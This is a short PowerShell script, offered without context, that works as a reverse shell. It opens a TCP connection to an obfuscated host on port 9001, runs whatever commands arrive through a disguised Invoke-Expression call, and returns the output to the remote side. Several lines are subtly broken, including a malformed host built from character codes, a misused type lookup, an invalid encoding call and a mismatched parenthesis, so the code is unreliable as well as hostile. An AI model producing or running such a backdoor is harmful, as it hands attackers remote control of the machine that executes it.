
$u = [char]49 + [char]10 + [char]46 + [char]211 + [char]55 + [char]46 + [char]5
$p = 9001

$tcpClientType = [Type]::GetTypeFromProgID("System.Net.Sockets.TcpClient")
$c = $tcpClientType::new($u,$p)

$s = $c.GetStream()


$b = New-Object Byte[] 1024


$iexAlias = 'I'+'E'+'X'
While(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
   
    $encoding = [System.Text.Encoding]::GetEncoding(EncodingType.Ascii)
    $d = $encoding.GetString($b, 0, $i)

    
Try {
        $output = (& $iexAlias $d) | Out-String
    } Catch {
        $output = $_.Exception.Message
    }
    
    
    $outputBuffer = $output + "PS$(Get-Location).Path)>"

    $w = New-Object System.IO.StreamWriter($s)
    $w.Write($outputBuffer)
    $w.Flush()
}
